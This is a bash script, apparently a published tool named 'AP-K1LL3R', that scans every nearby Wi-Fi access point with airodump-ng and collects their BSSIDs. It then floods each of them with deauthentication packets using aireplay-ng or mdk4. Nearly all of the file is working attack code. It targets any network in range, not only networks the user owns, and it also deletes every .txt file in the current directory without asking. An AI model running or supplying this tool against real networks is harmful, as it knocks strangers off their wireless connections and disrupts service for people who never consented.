#!/bin/bash
path=$(pwd)
c=$(ifconfig | grep mon | awk '{print $1}' | tr -d :)
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
RESTORE="\e[39"
BOLD="\e[1m"
NORMAL="\e[0m"
clear
rm *.txt
echo -e $BOLD"${CYAN}"
figlet AP-K1LL3R
sleep 1
echo ""
echo -e "${RED}[!] Important: ${MAGENTA}All errors will saved in ${RED}$path/error.log
${MAGENTA}If you have any unexpected error, report it to my github:

${YELLOW}https://github.com/ViperZCrew/ap_killer
${RED}Version: v0.3
${MAGENTA}Creator: MrBlackX
${BLUE}Telegram: t.me/rebl0x3r
"

echo -e "${GREEN}Starting script now..."
sleep 1
read -p "Press [Enter] to continue, press after 10 seconds CTRL+C. "
echo -e "${BLUE}[*] ${YELLOW}Scanning now for Access Points..."
sleep 1
echo -e "${BLUE}[*] ${YELLOW}Scanning in background for hosts.."
echo -e "${BLUE}[*] ${YELLOW}Press ${RED}CTRL+C ${YELLOW}to stop scan."
airodump-ng $c >> aps.txt
FILE='aps.txt'
sleep 0.5
echo -ne "${BLUE}[*] ${YELLOW}Successfully grabbed access points. Deauth ${CYAN}A${YELLOW}ll or ${CYAN}E${YELLOW}xit${CYAN}[A/E]?: "
read exc
if [[ $exc == "A" || $exc == "a" ]]
then
	if [ -f $FILE ]
	then
		sleep 0.5
		echo -e "${BLUE}[*] ${YELLOW}File found ${GREEN}$path/$FILE"
	else
		echo -e "{BLUE}[!] ${YELLOW}File not found"
	fi

	cat aps.txt | grep : | cut -d\  -f1,2 | sed -e 's/[\t]//g;/^$/d' | sed -e 's/\CH//g' | head -n 1453 | tail -30 >> mac.txt 2>$path/error.log
	FILE2='mac.txt'
	if [ -f $FILE2 ]
	then
		sleep 1
		echo -e "${BLUE}[*] ${YELLOW}Successfully extracted all mac addresses to: ${GREEN}$path/$FILE2"
	else
		echo -e "${RED}[!] ${YELLOW}No file found, please re-run script or check ${RED}$path$FILE2"
		sleep 1
	fi
	sleep 1
	echo -e "${BLUE}[*] ${YELLOW}Formatting BSSID file....."
	sort mac.txt | uniq >> sorted.txt
	rm mac.txt
	mv -v sorted.txt bssid.txt &>/dev/null
	cat -A -T bssid.txt | sed -e 's/[^a-z A-Z : 0-9]//g' >> mac.txt
	rm -rf bssid.txt aps.txt
	cat mac.txt | grep -o -E '(([[:xdigit:]]){2}:){5}([[:xdigit:]]){2}' >> result.txt
	rm mac.txt
	awk '!(count[$0]++)' result.txt >> endresult.txt
	count=$(wc -l $path/endresult.txt | cut -d\  -f1)
	sleep 1
	echo -e "${BLUE}[*] ${YELLOW}I have collected ${GREEN}$count ${YELLOW}available BSSIDs."
	echo -ne  "${BLUE}[*] ${YELLOW}How many times do you want to deauth wifi(default:10): "
	read count
	echo -e  "${BLUE}[*] ${YELLOW}Selected ${RED}$count ${YELLOW}will starting in few seconds..."
	sleep 0.5
	echo -e $GREEN ""
	read -p "[*] Do you want Mdk4 or Aireplay method?[M/A]: " method
	if [[ $method == "A" || $method == "a" ]]
	then
		echo -e "${BLUE}[*] ${YELLOW}Trying to attack with aireplay...."
		sleep 1
		while read -r line; do aireplay-ng --deauth $count -a $line --ignore-negative-one $c; done < endresult.txt
		read -p "[*] Press [Enter] to exit"
		rm *.txt	
	else
		echo -e "${BLUE}[*] ${YELLOW}Trying to use MDK4 method..."
		sleep 1
		mdk4 $c d -w $path/endresult.txt -x 10 -c h
		read -p "[*] Press [Enter] to exit"
		rm *.txt
	fi
else
	sleep 0.5
	echo -e "${RED}[!] ${MAGENTA}Leaving..."
	echo -e "${BLUE}[*] ${YELLOW}Disabling adapter mode.."
	airmon-ng stop $c 2>$path/error.log
	rm *.txt
	echo -e "${BLUE}[*] ${YELLOW}Restoring original mac..."
	n=$(ifconfig | grep wlan | awk '{print $1}' | tr -d :)
	ifconfig $1 down
	macchanger -p $1 2>$path/error.log
	ifconfig $1 up
	service network-manager restart
fi
